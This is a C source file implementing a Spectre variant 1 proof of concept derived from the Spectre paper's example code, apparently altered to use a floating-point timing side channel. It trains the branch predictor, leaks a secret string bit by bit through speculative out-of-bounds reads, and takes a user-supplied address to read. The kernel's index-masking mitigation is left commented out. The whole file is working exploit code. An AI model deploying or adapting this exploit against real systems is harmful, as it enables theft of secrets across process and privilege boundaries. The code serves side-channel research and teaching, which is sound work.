/*********************************************************************
*
* Spectre PoC
*
* This source code originates from the example code provided in the 
* "Spectre Attacks: Exploiting Speculative Execution" paper found at
* https://spectreattack.com/spectre.pdf
*
* Minor modifications have been made to fix compilation errors and
* improve documentation where possible.
*
**********************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtsc, rdtscp, clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
#endif /* ifdef _MSC_VER */

/* Automatically detect if SSE2 is not available when SSE is advertized */
#ifdef _MSC_VER
/* MSC */
#if _M_IX86_FP==1
#define NOSSE2
#endif
#else
/* Not MSC */
#if defined(__SSE__) && !defined(__SSE2__)
#define NOSSE2
#endif
#endif /* ifdef _MSC_VER */

#ifdef NOSSE2
#define NORDTSCP
#define NOMFENCE
#define NOCLFLUSH
#endif

int FUC_THRESH = 850;
uint8_t readChar;

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[16] = {
  2,
  2,
  4,
  4,
  6,
  6,
  8,
  8,
  10,
  10,
  12,
  12,
  14,
  14,
  16,
  16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char * secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
uint64_t total[2]; 
uint64_t totalRefs[2];
uint64_t runningAve[2];

#ifdef LINUX_KERNEL_MITIGATION
/* From https://github.com/torvalds/linux/blob/cb6416592bc2a8b731dabcec0d63cda270764fc6/arch/x86/include/asm/barrier.h#L27 */
/**
 * array_index_mask_nospec() - generate a mask that is ~0UL when the
 * 	bounds check succeeds and 0 otherwise
 * @index: array element index
 * @size: number of elements in array
 *
 * Returns:
 *     0 - (index < size)
 */
static inline unsigned long array_index_mask_nospec(unsigned long index,
		unsigned long size)
{
	unsigned long mask;

	__asm__ __volatile__ ("cmp %1,%2; sbb %0,%0;"
			:"=r" (mask)
			:"g"(size),"r" (index)
			:"cc");
	return mask;
}
#endif

double victim_function(size_t x, uint8_t take, uint8_t bitMask) {
  	 double f1, f3;
	 volatile double f2 = 101.232131232;
	 f3 = 2.543532535;
	if (take > 0){
    //x &= array_index_mask_nospec(x, array1_size);
    //temp &= array2[array1[x] * 512];
    temp = array1[x] >> bitMask;
	 if (temp & 1){
		f1 = f2 / f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		f2 = f1 / f3;
		f2 = f2 * f3;
		
	 }
   }
	return f2;
  
}


/********************************************************************
Analysis code
********************************************************************/
#ifdef NOCLFLUSH
#define CACHE_FLUSH_ITERATIONS 2048
#define CACHE_FLUSH_STRIDE 4096
uint8_t cache_flush_array[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];

/* Flush memory using long SSE instructions */
void flush_memory_sse(uint8_t * addr)
{
  float * p = (float *)addr;
  float c = 0.f;
  __m128 i = _mm_setr_ps(c, c, c, c);

  int k, l;
  /* Non-sequential memory addressing by looping through k by l */
  for (k = 0; k < 4; k++)
    for (l = 0; l < 4; l++)
      _mm_stream_ps(&p[(l * 4 + k) * 4], i);
}
#endif

void readMemoryByte(size_t malicious_x, uint8_t bitMask) {
  static int results[256];
  int tries, i, j, k, mix_i;
  unsigned int junk = 0;
  size_t training_x, x, attackFlip;
  register uint64_t time1, time2;
  volatile uint8_t * addr, take;
  volatile double f1, f2, f3;

  for (tries = 256; tries > 0; tries--) {

    training_x = tries % array1_size;
    for (j = 64; j >= 0; j--) {
      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = (j % (9+(time1 % 6)) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
		attackFlip = x;
      x = training_x ^ (x & (malicious_x ^ training_x));
#ifndef NORDTSCP
      time1 = __rdtscp( & junk); /* READ TIMER */
#else
#ifndef NOMFENCE
      _mm_mfence();
      time1 = __rdtsc(); /* READ TIMER */
      _mm_mfence();
#else
      time1 = __rdtsc(); /* READ TIMER */
#endif
#endif
		f1 = 102.2231432;
		f2 = 3.214212331;
		f3 = 3.45325312;
		f1 = f1 / f2;
		f1 = f1 + f2;
		f1 = f1 / f2;
		f1 = f1 + f2;
		f1 = f1 / f2;
		f1 = f1 + f2;
		f1 = f1 / f2;
		f1 = f1 + f2;
		f1 = f1 / f2;
		f1 = f1 + f2;
		f1 = f1 / f2;
		f1 = f1 + f2;
		f1 = f1 / f2;
		f1 = f1 + f2;
		f1 = f1 / f2;
		f1 = f1 + f2;
		f1 = f1 / f2;
		f1 = f1 + f2;
		f1 = f1 / f2;
		f1 = f1 + f2;
		f1 = f1 / f2;
		f1 = f1 + f2;
		f1 = f1 / f2;
		f1 = f1 + f2;
		f1 = f1 / f2;
		f1 = f1 + f2;
		f1 = f1 / f2;
		f1 = f1 + f2;
		f1 = f1 / f2;
		f1 = f1 + f2;
		f1 = f1 / f2;
		f1 = f1 + f2;
		f1 = f1 / f2;
		f1 = f1 + f2;
		f1 = f1 / f2;
		f1 = f1 + f2;
		take = ((int)f1 | 7 ) & (j % 6);

      /* Call the victim! */
      victim_function(x, take, bitMask);

#ifndef NORDTSCP
      time2 = __rdtscp( & junk) - time1; /* READ TIMER */
#else
#ifndef NOMFENCE
      _mm_mfence();
      time2 = __rdtsc() - time1; /* READ TIMER */
      _mm_mfence();
#else
      time2 = __rdtsc() - time1; /* READ TIMER */
#endif
#endif
		time2 = time2 & attackFlip;// & 0x3FF;
		total[(array1[x] >> bitMask) & 1] += time2;
		totalRefs[(array1[x] >> bitMask) & 1]  += 1 & attackFlip;


    }

  }
	 ////printf("Byte %c : bit %d : time %ld\n", array1[malicious_x], (array1[malicious_x] >> bitMask) & 1, total[(array1[malicious_x] >> bitMask) & 1] / totalRefs[(array1[malicious_x] >> bitMask) & 1]);
	 uint8_t  tmpChar  = ((total[(array1[malicious_x] >> bitMask) & 1] / totalRefs[(array1[malicious_x] >> bitMask) & 1] ) > FUC_THRESH) ? (1 << 7) : 0 ;
	 readChar = (readChar >> 1) | tmpChar;
		total[array1[malicious_x] & 1] = 0;
		totalRefs[array1[malicious_x] & 1]  = 0;
	   printf("%d",  tmpChar >> 7);
}

int main(int argc,
  const char * * argv) {
  total[0] = 0;
  total[1] = 0;
  totalRefs[0] = 0;
  totalRefs[1] = 0;

  /* Default for malicious_x is the secret string address */
  size_t malicious_x = (size_t)(secret - (char * ) array1);
  
  /* Default addresses to read is 40 (which is the length of the secret string) */
  
  int len = 40;
  uint8_t value[2];
  int i;

  for (i = 0; i < (int)sizeof(array2); i++) {
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
  }

  /* Parse the  from the first command line argument.
     (OPTIONAL) */
  if (argc >= 2) {
    sscanf(argv[1], "%d", &FUC_THRESH);
	 printf("Using timing threshold: %d\n", FUC_THRESH); 
  } else {
	 printf("Using default timing threshold: %d\nYou may need to tweak this: ./spectre.out <threshold>\n", FUC_THRESH); 
  }

  /* Parse the malicious x address and length from the second and third
     command line argument. (OPTIONAL) */
  if (argc >= 4) {
    sscanf(argv[2], "%p", (void * * )( &malicious_x));

    /* Convert input value into a pointer */
    malicious_x -= (size_t) array1;

    sscanf(argv[3], "%d", &len);
  }


  runningAve[0] = 0;
  runningAve[1] = 0;

  //printf("Reading %d bytes:\n", len);
	printf("Warming up B.P. ");
	for (int i = 0; i < 8; i++){
    readMemoryByte(malicious_x, i);
	}
	for (int i = 0; i < 8; i++){
    readMemoryByte(malicious_x, i);
	}
	for (int i = 0; i < 8; i++){
    readMemoryByte(malicious_x, i);
	}
	printf("..done\n");
  len = 40;
  while (--len >= 0) {
	readChar = 0;
	printf("[");
	for (int i = 0; i < 8; i++){
    readMemoryByte(malicious_x, i);
	}
	printf("] read: %c\n", (char)readChar);
	malicious_x++;
  }
  return (0);
}
